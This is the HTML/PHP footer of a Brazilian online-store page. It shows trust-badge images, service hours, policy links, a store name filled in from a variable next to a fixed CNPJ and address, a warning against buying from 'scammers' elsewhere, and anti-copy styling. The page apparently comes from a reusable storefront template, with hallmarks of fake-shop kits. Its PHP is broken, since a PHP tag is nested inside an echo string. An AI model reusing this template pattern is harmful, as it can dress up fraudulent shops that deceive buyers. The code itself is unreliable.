<img decoding="async" width="800" height="373" src="./arquivos/RECLAMEAQUI.webp?Tfake=<?php echo time();?>" class="attachment-full size-full" />															</div>
</div>
<div class="elementor-element elementor-element-27e96543 elementor-widget-mobile__width-initial elementor-widget__width-initial elementor-widget elementor-widget-image" data-id="27e96543" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="357" height="141" src="./arquivos/GOOGLE.webp?Tfake=<?php echo time();?>" class="attachment-full size-full" />															</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</section>
<section class="elementor-section elementor-top-section elementor-element elementor-element-2d04d306 elementor-hidden-desktop elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2d04d306" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-78aa0004" data-id="78aa0004" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-623051cd elementor-widget elementor-widget-image" data-id="623051cd" data-element_type="widget" data-widget_type="image.default">



<div class="elementor-widget-container">

<?php 
$f = "arquivos/logo/"; 
$i = glob($f . "*.png");

foreach($i as $im){
echo '
<img decoding="async" width="636" height="324" src="'.$im.'?Tfake=<?php echo time();?>" class="attachment-large size-large"  />															</div>

';
}
?>


</div>


</div>
</div>
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-69b632c3" data-id="69b632c3" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-430d480f elementor-widget elementor-widget-toggle" data-id="430d480f" data-element_type="widget" data-widget_type="toggle.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-toggle{text-align:left}.elementor-toggle .elementor-tab-title{font-weight:700;line-height:1;margin:0;padding:15px;border-bottom:1px solid #d4d4d4;cursor:pointer;outline:none}.elementor-toggle .elementor-tab-title .elementor-toggle-icon{display:inline-block;width:1em}.elementor-toggle .elementor-tab-title .elementor-toggle-icon svg{-webkit-margin-start:-5px;margin-inline-start:-5px;width:1em;height:1em}.elementor-toggle .elementor-tab-title .elementor-toggle-icon.elementor-toggle-icon-right{float:right;text-align:right}.elementor-toggle .elementor-tab-title .elementor-toggle-icon.elementor-toggle-icon-left{float:left;text-align:left}.elementor-toggle .elementor-tab-title .elementor-toggle-icon .elementor-toggle-icon-closed{display:block}.elementor-toggle .elementor-tab-title .elementor-toggle-icon .elementor-toggle-icon-opened{display:none}.elementor-toggle .elementor-tab-title.elementor-active{border-bottom:none}.elementor-toggle .elementor-tab-title.elementor-active .elementor-toggle-icon-closed{display:none}.elementor-toggle .elementor-tab-title.elementor-active .elementor-toggle-icon-opened{display:block}.elementor-toggle .elementor-tab-content{padding:15px;border-bottom:1px solid #d4d4d4;display:none}@media (max-width:767px){.elementor-toggle .elementor-tab-title{padding:12px}.elementor-toggle .elementor-tab-content{padding:12px 10px}}</style>		<div class="elementor-toggle" role="tablist">
<div class="elementor-toggle-item">
<div id="elementor-tab-title-1121" class="elementor-tab-title" data-tab="1" role="tab" aria-controls="elementor-tab-content-1121" aria-expanded="false">
<span class="elementor-toggle-icon elementor-toggle-icon-right" aria-hidden="true">
<span class="elementor-toggle-icon-closed"><i class="fas fa-plus"></i></span>
<span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened fas fa-minus"></i></span>
</span>
<a href="#" class="elementor-toggle-title">ATENDIMENTO AO CLIENTE</a>
</div>

<div id="elementor-tab-content-1121" class="elementor-tab-content elementor-clearfix" data-tab="1" role="tabpanel" aria-labelledby="elementor-tab-title-1121"><p style="line-height: 1.5; font-size: 15px; color: #555555; font-family: 'Barlow Condensed', sans-serif, 'San Francisco', -apple-system, BlinkMacSystemFont, 'avenir next', avenir, 'helvetica neue', helvetica, ubuntu, roboto, noto, 'segoe ui', arial;">Segunda a Sexta das 9h às 18h</p><p style="line-height: 1.5; font-size: 15px; color: #555555; font-family: 'Barlow Condensed', sans-serif, 'San Francisco', -apple-system, BlinkMacSystemFont, 'avenir next', avenir, 'helvetica neue', helvetica, ubuntu, roboto, noto, 'segoe ui', arial;">Sábados das 10h às 17h</p><p style="line-height: 1.5; font-size: 15px; color: #555555; font-family: 'Barlow Condensed', sans-serif, 'San Francisco', -apple-system, BlinkMacSystemFont, 'avenir next', avenir, 'helvetica neue', helvetica, ubuntu, roboto, noto, 'segoe ui', arial;"><span style="font-weight: bold;">Assistência técnica (atendimento por telefone):</span><br />Domingo a Domingo das 9h às 23h</p></div>
</div>
<div class="elementor-toggle-item">
<div id="elementor-tab-title-1122" class="elementor-tab-title" data-tab="2" role="tab" aria-controls="elementor-tab-content-1122" aria-expanded="false">
<span class="elementor-toggle-icon elementor-toggle-icon-right" aria-hidden="true">
<span class="elementor-toggle-icon-closed"><i class="fas fa-plus"></i></span>
<span class="elementor-toggle-icon-opened"><i class="elementor-toggle-icon-opened fas fa-minus"></i></span>
</span>
<a href="#" class="elementor-toggle-title">TERMOS E CONDIÇÕES</a>
</div>

<div id="elementor-tab-content-1122" class="elementor-tab-content elementor-clearfix" data-tab="2" role="tabpanel" aria-labelledby="elementor-tab-title-1122"><p>Política de Privacidade</p><p>Política de Reembolso</p><p>Política de Envio</p><p>Termos e condições</p></div>
</div>
</div>
</div>
</div>
<div class="elementor-element elementor-element-405a0c9c elementor-widget elementor-widget-text-editor" data-id="405a0c9c" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p><strong>NOSSA NEWSLATTER</strong></p><p>Assine nossa newsletter e receba as melhores ofertas DE GRAÇA!</p>						</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-760f7ee8" data-id="760f7ee8" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-18cad11b elementor-widget elementor-widget-text-editor" data-id="18cad11b" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
Preços e condições de pagamento exclusivos para compras neste site oficial, podendo variar com o tempo da oferta. Evite comprar produtos mais baratos ou de outras lojas, pois você pode estar sendo enganado(a) por um golpista. Caso você compre os mesmos produtos em outras lojas,<strong> não nos responsabilizamos por quaisquer problemas.</strong>						</div>
</div>
<div class="elementor-element elementor-element-14da8330 elementor-widget elementor-widget-text-editor" data-id="14da8330" data-element_type="widget" data-widget_type="text-editor.default">
<div class="elementor-widget-container">
<p>Loja <?php echo $nome;?> © CNPJ 38.373.657/0001-77 | R. Armando Salles de Oliveira, 53 -Taubaté – SP, 12030-080 | Todos direitos reservados.</p>						</div>
</div>

<div class="elementor-element elementor-element-3685c10 elementor-widget-mobile__width-initial elementor-widget elementor-widget-image" data-id="3685c10" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="500" height="216" src="./arquivos/NORTON.webp?Tfake=<?php echo time();?>" class="attachment-full size-full"/>															</div>
</div>

<div class="elementor-element elementor-element-199a192f elementor-widget-mobile__width-initial elementor-widget elementor-widget-image" data-id="199a192f" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="800" height="373" src="./arquivos/RECLAMEAQUI.webp?Tfake=<?php echo time();?>" class="attachment-full size-full"/>															</div>
</div>

<div class="elementor-element elementor-element-39788ed5 elementor-widget-mobile__width-initial elementor-widget elementor-widget-image" data-id="39788ed5" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<img decoding="async" width="357" height="141" src="./arquivos/GOOGLE.webp?Tfake=<?php echo time();?>" class="attachment-full size-full"/>															</div>

</div>
</div>
</div>
</div>
</section>
</div>
<div id="ays_tooltip" ><p>You cannot copy content of this page</p>
</div>
<style>
#ays_tooltip,.ays_tooltip_class {
display: none;
position: absolute;
z-index: 999999999;
background-color: #ffffff;

background-repeat: no-repeat;
background-position: center center;
background-size: cover;
opacity:1;
border: 1px solid #b7b7b7;
border-radius: 3px;
box-shadow: rgba(0,0,0,0) 0px 0px 15px  1px;
color: #ff0000;
padding: 5px;
font-size: 12px;
text-transform: none;
;
}

#ays_tooltip > *, .ays_tooltip_class > * {
color: #ff0000;
font-size: 12px;
}

@media screen and (max-width: 768px){
#ays_tooltip,.ays_tooltip_class {
font-size: 12px;
}
#ays_tooltip > *, .ays_tooltip_class > * {	                            
font-size: 12px;
}
}


</style>
<style>
*:not(input):not(textarea)::selection {
background-color: transparent !important;
color: inherit !important;
}

*:not(input):not(textarea)::-moz-selection {
background-color: transparent !important;
color: inherit !important;
}

</style>

</body>
</html>